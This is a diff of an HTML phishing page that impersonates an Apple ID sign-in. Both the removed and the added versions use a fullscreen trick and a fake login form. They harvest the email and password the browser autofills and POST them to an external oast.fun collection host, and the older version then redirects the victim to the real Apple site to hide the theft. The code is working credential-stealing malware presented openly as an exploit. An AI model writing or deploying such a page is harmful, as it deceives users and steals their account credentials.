@@ -1,122 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔐 Sign in to Your Apple ID</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification Required</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
       margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background-color: #f2f2f7;
-      color: #000;
-      height: 100%;
+      font-family: -apple-system, sans-serif;
+      background: white;
       overflow: hidden;
     }
 
-    .navbar {
-      height: 44px;
-      background-color: #f9f9f9;
+    .center {
+      height: 100vh;
       display: flex;
-      align-items: center;
+      flex-direction: column;
       justify-content: center;
-      font-size: 15px;
-      font-weight: 500;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-      z-index: 9999;
-      position: fixed;
-      width: 100%;
-      top: 0;
-    }
-
-    .container {
-      padding: 80px 24px;
-      max-width: 380px;
-      margin: auto;
+      align-items: center;
     }
 
     input {
-      width: 100%;
-      padding: 14px;
-      margin-bottom: 14px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
+      padding: 12px;
       font-size: 17px;
-    }
-
-    .autofill-overlay {
-      position: absolute;
-      top: 144px;
-      left: 24px;
-      width: calc(100% - 48px);
-      height: 46px;
-      background: #fff;
-      border: 1px solid #ccc;
+      width: 80%;
+      margin: 8px 0;
       border-radius: 8px;
-      padding: 12px;
-      font-size: 16px;
-      color: #222;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.08);
-      z-index: 999;
-      cursor: pointer;
+      border: 1px solid #ccc;
     }
 
-    .fullscreen-btn {
-      margin-top: 20px;
-      padding: 12px;
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
       background: #007aff;
       color: white;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
-      width: 100%;
+      margin-top: 12px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
+  <div class="center">
+    <h2>Session expired</h2>
+    <p>You must re-login to continue apple.com.</p>
+    <button onclick="exploit()">Continue</button>
+  </div>
 
-<div class="navbar">🔒 https://appleid.apple.com</div>
-
-<div class="container">
-  <h2>Apple ID Required</h2>
-
-  <input type="email" id="email" placeholder="Email or Apple ID" autocomplete="on" autofocus>
-  <div class="autofill-overlay" onclick="stepIntoFullscreen()">user@icloud.com</div>
-
-  <input type="password" id="pass" placeholder="Password" autocomplete="on">
-
-  <button class="fullscreen-btn" onclick="stepIntoFullscreen()">Continue</button>
-</div>
-
-<script>
-function stepIntoFullscreen() {
-  const el = document.documentElement;
-  if (el.requestFullscreen) el.requestFullscreen();
-  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-
-  // Chained with overlay click → now start idle timing
-  window.requestIdleCallback(() => {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-
-    if (email.length > 3 && pass.length > 3) {
-      exfiltrate(email, pass);
+  <script>
+    function exfil(email, pass) {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/autofill", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, pass })
+      });
     }
-  }, { timeout: 1000 }); // <= short delay but stealth
-}
 
-function exfiltrate(email, pass) {
-  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
-    method: "POST",
-    body: JSON.stringify({ email, pass }),
-    headers: { "Content-Type": "application/json" }
-  });
+    function monitorAutofill() {
+      const emailField = document.getElementById('email');
+      const passField = document.getElementById('pass');
 
-  setTimeout(() => {
-    location.href = "https://appleid.apple.com"; // misattribution
-  }, 700);
-}
-</script>
+      const interval = setInterval(() => {
+        const email = emailField.value;
+        const pass = passField.value;
 
+        if (email.length > 3 && pass.length > 3) {
+          clearInterval(interval);
+          exfil(email, pass);
+        }
+      }, 300);
+    }
+
+    function exploit() {
+      document.documentElement.requestFullscreen().then(() => {
+        document.body.innerHTML = `
+          <div class="center">
+            <h2>🔒 Apple ID Login Required</h2>
+            <input id="email" type="email" autocomplete="on" placeholder="Email / Apple ID"><br>
+            <input id="pass" type="password" autocomplete="on" placeholder="Password"><br>
+            <button onclick="fakeLogin()">Login</button>
+          </div>
+        `;
+
+        monitorAutofill(); // start watching autofill after UI replaces
+      });
+    }
+
+    function fakeLogin() {
+      alert("🔐 Login failed. Please try again.");
+    }
+  </script>
 </body>
 </html>
